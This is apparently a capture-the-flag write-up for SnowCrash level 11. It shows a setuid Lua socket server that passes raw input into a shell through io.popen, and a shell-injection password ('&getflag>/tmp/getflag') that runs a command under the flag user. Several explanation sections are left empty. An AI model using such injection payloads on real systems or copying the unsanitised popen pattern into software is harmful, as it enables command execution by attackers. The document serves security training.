# LEVEL11

## 1. Inspect The Home Directory

```bash
level11@SnowCrash:~$ ls -l
total 4
-rwsr-sr-x 1 flag11 level11 668 Mar  5  2016 level11.lua
level11@SnowCrash:~$ cat level11.lua 
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

TEXT

Breakdown the program:
- Get a socket and bind to `127.0.0.1` localhost to the port `5151`.
- Accept a new client, then ask for a password.
- When receive the pass, send it to `hash()`
- `hash()` take the pass in argument and send it to `sha1sum` via `io.popen()` with `echo "..pass.." | sha1sum` (`..pass..` stand for the arg `pass`). It's there where a vulnerability can be used.
- Then compare the hash pass to `f05d1d066fb246efe0c6f7d095f909a7a0cf34a0` and print a message depending on the result.

## 2. Communication With The Program

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: test
Erf nope..
```

TEXT

**Explanation:**
>- `nc`				: 
>- `locahost`		: 
>- `5151`			: 


## 3.FAUSSE PISTE

TEXT

```
f05d1d066fb246efe0c6f7d095f909a7a0cf34a0
```

TEXT - [Dcode SHA1 decryptor](https://www.dcode.fr/hash-sha1)

```
NotSoEasy
```

TEXT

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: NotSoEasy
Erf nope..
```

**Explanation:**
>- `nc`				: 
>- `locahost`		: 
>- `5151`			: 

## 4. Shell Injection 

```bash
level11@SnowCrash:~$ nc localhost 5151
Password: &getflag>/tmp/getflag
Erf nope..
level11@SnowCrash:~$ cat /tmp/getflag
Check flag.Here is your token : XXX
```

**Explanation of the injection:**
>- `&`					: 
>- `getflag`			: 
>- `>/tmp/getflag`		: 


**Explanation:**
>- `nc`				: 
>- `locahost`		: 
>- `5151`			: 